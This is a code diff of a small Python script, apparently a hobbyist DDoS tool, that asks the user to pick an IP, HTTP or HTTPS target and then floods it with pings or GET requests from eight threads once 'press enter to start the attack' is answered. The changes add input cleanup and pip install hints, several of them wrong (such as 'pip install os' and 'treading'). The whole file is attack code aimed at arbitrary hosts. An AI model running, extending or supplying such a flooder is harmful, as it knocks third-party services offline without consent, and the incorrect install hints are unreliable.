@@ -1,36 +1,36 @@
 #creator: Fxrt2711
-#version: 1.0.0
+#version: 4.0.4
 #date: 25/1/24
-#update: 26/1/24
+#update: 28/1/24
 #
 try:
     import os
 except:
-    exit("missing MAIN lib: os")
+    exit("missing MAIN lib: os !! \n install it with: pip install os")
 try:
     import sys
 except:
-    exit("missing MAIN lib: sys")
+    exit("missing MAIN lib: sys !! \n install it with: pip install sys")
 try:
     from ping3 import ping, verbose_ping
 except:
-    exit("missing MAIN lib: ping3")
+    exit("missing MAIN lib: ping3 !! \n install it with: pip install ping3")
 try:
     from colorama import Fore
 except:
-    exit("missing lib: colorama")
+    exit("missing lib: colorama !! \n install it with: pip install colorama")
 try:
     import threading
 except:
-    exit("missing lib: threading")
+    exit("missing lib: threading !! \n install it with: pip install treading")
 try:
     import requests
 except:
-    exit("missing lib: requests")
+    exit("missing lib: requests !! \n install it with: pip install requests")
 try:
     from time import sleep
 except:
-    exit("missing lib: time")
+    exit("missing lib: time !! \n install it with: pip install time")
 #
 op_sy = sys.platform
 #
@@ -52,7 +52,10 @@ def dos_trget(target,st):
                     ives = ping(target)
                     print(f"ping sented to {target} delay: {ives}")
                 except:
-                    print(f"waiting for {target} to accept")
+                    try:
+                        print(f"waiting for {target} to accept")
+                    except:
+                        exit()
                 try:
                     pass
                 except:
@@ -60,20 +63,17 @@ def dos_trget(target,st):
 #
             else:
                 rves = requests.get(target)
-                print(f"Request sented to {target}")
                 try:
-                    pass
+                    print(f"Request sented to {target}")
                 except:
                     exit()
 #
         except requests.exceptions.ConnectionError:
             sleep(0.1)
-            print("Check internet connection")
             try:
-                pass
+                print("Check internet connection")
             except:
                 exit()
-#
 #
 #
 while True:
@@ -99,12 +99,14 @@ while True:
     while run_target_selsection:
 #
         print (Fore.GREEN + "do you want to ddos (ip)(https)(http)")
-        selection_input = input("~> ")
+        un_selection_input = input("~> ")
+        selection_input = un_selection_input.replace(' ','')
 #
         if selection_input == ("http"):
             while run_http_url:
 #
-                target_url_ip = input(Fore.GREEN + "Enter URL>> ")
+                unh_target_url_ip = input(Fore.GREEN + "Enter URL>> ")
+                target_url_ip = unh_target_url_ip.replace(' ','')
 #
                 if target_url_ip.startswith("https"):
                     print("wrong url. you can,t ddos https")
@@ -121,7 +123,8 @@ while True:
         elif selection_input == ("https"):
             while run_https_url:
 #
-                target_url_ip = input(Fore.GREEN + "Enter URL>> ")
+                unhp_target_url_ip = input(Fore.GREEN + "Enter URL>> ")
+                target_url_ip = unhp_target_url_ip.replace(' ','')
 #
                 if not target_url_ip.startswith("https"):
                     print("wrong url. you can,t ddos http")
@@ -138,7 +141,9 @@ while True:
         elif selection_input == ("ip"):
             while run_ip:
 #
-                target_url_ip = input(Fore.GREEN + "Enter IP>> ")
+                unip_target_url_ip = input(Fore.GREEN + "Enter IP>> ")
+                target_url_ip = unip_target_url_ip.replace(' ','')
+#
                 if not target_url_ip.__contains__("."):
                     print("invalid ip")
                     pass
@@ -171,7 +176,6 @@ while True:
             pass
 # 
 #
-#
     print("press enter to start the attack")
     nothing = input("")
 #
@@ -197,9 +201,8 @@ while True:
             thr_6.start()
             thr_7.start()
             thr_8.start()
-            print(f"waiting for {target_url_ip} to accept")
             try:
-                pass
+                print(f"waiting for {target_url_ip} to accept")
             except:
                 exit()
     else:
